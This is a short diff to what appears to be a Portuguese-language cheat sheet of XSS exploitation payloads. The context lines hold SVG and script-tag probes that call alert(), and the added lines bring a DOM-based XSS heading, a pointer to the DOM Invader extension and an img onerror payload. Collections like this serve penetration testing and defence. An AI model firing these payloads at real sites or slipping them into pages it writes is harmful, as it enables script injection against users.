@@ -33,5 +33,10 @@ Vários scripts voltados a exploração da vulnerabilidade XSS
 <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
 <svg><script>alert('33')
 <svg><script>alert&lpar;'33'&rpar;
+  
+# DomBased XSS
+  // obs: Utilizar a extensão DOM Invader
+  
+#"><img src=/ onerror=alert(2)>
 
 
